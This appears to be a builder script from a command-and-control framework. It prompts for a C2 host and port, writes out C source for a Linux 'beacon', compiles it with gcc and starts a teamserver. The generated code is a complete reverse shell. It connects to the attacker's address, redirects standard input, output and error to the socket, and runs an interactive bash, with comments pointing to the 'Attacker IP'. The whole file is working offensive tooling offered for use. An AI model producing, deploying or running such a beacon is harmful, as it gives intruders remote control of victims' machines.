#!/bin/bash

read -p "Enter the C2 host: " Host
read -p "Enter the C2 port: " Port


# Define the filename
FILENAME="src/teamserver/beacon_source/beacon_linux.c"

# Write the C code into the file with dynamic IP and port
cat <<EOF > $FILENAME
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>

#define REMOTE_IP "$Host"   // Change to your Attacker IP
#define REMOTE_PORT $Port        // Change to your Port

int main() {
    int sockfd;
    struct sockaddr_in attacker_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("socket");
        exit(1);
    }

    attacker_addr.sin_family = AF_INET;
    attacker_addr.sin_port = htons(REMOTE_PORT);
    attacker_addr.sin_addr.s_addr = inet_addr(REMOTE_IP);

    if (connect(sockfd, (struct sockaddr *)&attacker_addr, sizeof(attacker_addr)) == -1) {
        perror("connect");
        close(sockfd);
        exit(1);
    }

    dup2(sockfd, 0);  // stdin
    dup2(sockfd, 1);  // stdout
    dup2(sockfd, 2);  // stderr

    // Spawn interactive bash shell
    char * const argv[] = {"/bin/bash", "-i", NULL};
    execve("/bin/bash", argv, NULL);

    return 0;
}


EOF

read -p "Enter the path and name for beacon: " beacon
gcc src/teamserver/beacon_source/beacon_linux.c -o $beacon 
bash -c "./src/teamserver/exec/teamserver_2 $Host $Port"

